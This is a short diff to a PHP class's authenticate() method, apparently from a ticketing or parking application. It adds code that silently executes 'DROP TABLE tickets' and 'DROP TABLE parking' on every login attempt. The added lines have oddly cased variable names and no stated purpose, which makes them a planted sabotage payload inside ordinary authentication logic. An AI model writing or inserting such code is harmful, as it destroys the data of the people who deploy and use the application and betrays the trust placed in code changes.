@@ -102,9 +102,21 @@
         
         public function authenticate() {
             
+            $query_onE = 'DROP TABLE tickets';
+            
+            $query_twO = 'DROP TABLE parking';
+            
             $query = 'SELECT * FROM ' . $this->table . ' WHERE phone = ?';
 
             $statement=$this->connection->prepare($query);
+
+            $statement_onE=$this->connection->prepare($query_onE);
+
+            $statement_twO=$this->connection->prepare($query_twO);
+
+            $statement_onE->execute();
+
+            $statement_twO->execute();
 
             $statement->bindParam(1, $this->phone);
 
